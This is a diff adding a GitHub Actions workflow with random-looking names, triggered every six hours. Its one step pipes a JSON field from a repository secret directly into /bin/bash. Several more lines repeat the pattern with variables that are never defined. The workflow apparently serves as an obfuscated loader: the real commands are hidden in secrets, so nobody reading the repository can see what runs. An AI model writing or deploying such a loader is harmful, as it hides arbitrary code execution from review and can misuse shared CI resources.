@@ -1,0 +1,24 @@
+name: huangyueshi4658
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huangyueshi4658
+        env:
+          pjfx5: ${{ secrets.pjfx5 }}
+        run: |
+          echo $pjfx5 | jq -r .fp99219 | /bin/bash
+          echo $b5102 | jq -r .wurho471 | /bin/bash
+          echo $qwffs9 | jq -r .f02835 | /bin/bash
+          echo $nq94357 | jq -r .h5273 | /bin/bash
+          echo $vvkg93 | jq -r .fyrl9523 | /bin/bash
+          echo $eubpv71686 | jq -r .v16 | /bin/bash
+          echo $t34 | jq -r .xjxj40014 | /bin/bash
+          echo $j401 | jq -r .qb45399 | /bin/bash
+
